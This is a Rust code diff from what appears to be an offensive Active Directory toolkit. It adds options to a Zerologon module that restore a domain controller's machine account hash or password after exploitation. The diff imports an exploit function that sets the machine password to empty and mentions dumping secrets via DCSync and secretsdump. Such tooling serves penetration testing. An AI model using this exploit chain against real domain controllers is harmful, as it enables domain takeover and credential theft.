@@ -134,6 +134,16 @@ struct ZerologonArgs {
     /// NetBIOS domain (for the DCSync proof), e.g. CORP.
     #[arg(long, default_value = "")]
     domain: String,
+    /// RESTORE the machine account to this NT hash (32 hex) — sets AD back to match the DC's local
+    /// secret after an exploit. Run this after `--exploit` (machine password is empty) with the
+    /// original DC$ hash (recorded pre-exploit, or recovered via secretsdump of $MACHINE.ACC).
+    #[arg(long)]
+    restore: Option<String>,
+    /// FULL restore: set the machine account back to this CLEARTEXT (regenerates NT + AES keys, so
+    /// the AES secure channel heals — unlike --restore which only sets the NT hash). Use the DC's
+    /// current local machine password.
+    #[arg(long)]
+    restore_password: Option<String>,
 }
 
 #[derive(Parser)]
@@ -2165,7 +2175,45 @@ async fn esc_registry_scan(a: EscArgs) -> Result<()> {
 /// report whether the DC accepts it. Never calls NetrServerPasswordSet2 — the machine password is
 /// left untouched. Exploitation (with password restore) is a separate, explicitly-confirmed step.
 async fn zerologon(a: ZerologonArgs) -> Result<()> {
-    use dcerpc::netlogon::{detect_zerologon, exploit_set_empty_password, Zerologon};
+    use dcerpc::netlogon::{
+        detect_zerologon, exploit_set_empty_password, restore_password, restore_password_cleartext,
+        Zerologon,
+    };
+
+    // Full restore path: set the machine account back to a known CLEARTEXT (heals NT + AES).
+    if let Some(pw) = &a.restore_password {
+        let sp = ui::Spinner::start(format!("{} — full restore of {}$ (cleartext)", a.host, a.netbios));
+        let ok = restore_password_cleartext(&a.host, &a.netbios, pw, a.attempts).await?;
+        if ok {
+            sp.done("restore accepted");
+            ui::ok(&format!(
+                "machine account {}$ fully restored (NT + AES) — reboot the DC to heal the secure channel.",
+                a.netbios
+            ));
+        } else {
+            sp.done("restore not accepted");
+            ui::warn("NetrServerPasswordSet2 rejected (DC not vulnerable, or machine password not empty).");
+        }
+        return Ok(());
+    }
+
+    // Restore path: set the machine account back to a known NT hash over the zero channel.
+    if let Some(hex) = &a.restore {
+        let nt = parse_nt_hash(hex)?;
+        let sp = ui::Spinner::start(format!("{} — restoring {}$ machine hash via Netlogon", a.host, a.netbios));
+        let ok = restore_password(&a.host, &a.netbios, &nt, a.attempts).await?;
+        if ok {
+            sp.done("restore accepted");
+            ui::ok(&format!(
+                "machine account {}$ set back to {hex} — reboot the DC so LSASS re-reads the (now-matching) secret.",
+                a.netbios
+            ));
+        } else {
+            sp.done("restore not accepted");
+            ui::warn("NetrServerPasswordSet was rejected (DC no longer vulnerable, or machine password is not empty).");
+        }
+        return Ok(());
+    }
     let sp = ui::Spinner::start(format!(
         "{} — Netlogon zero-auth probe (≤{} attempts)",
         a.host, a.attempts
